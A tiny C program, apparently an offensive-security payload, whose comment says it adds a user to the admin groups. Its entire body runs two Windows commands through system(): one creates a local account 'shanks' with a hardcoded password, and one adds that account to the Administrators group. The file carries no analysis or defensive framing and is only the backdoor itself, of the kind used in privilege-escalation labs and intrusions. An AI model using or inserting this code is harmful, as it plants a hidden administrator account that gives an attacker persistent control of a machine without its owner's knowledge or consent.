/* adds user shanks to the adm groups */
#include <stdlib.h>

int main ()
{
  int  i;

  i = system ("net user shanks password123! /add");
  i = system ("net localgroup administrators shanks /add");

  return 0;
}
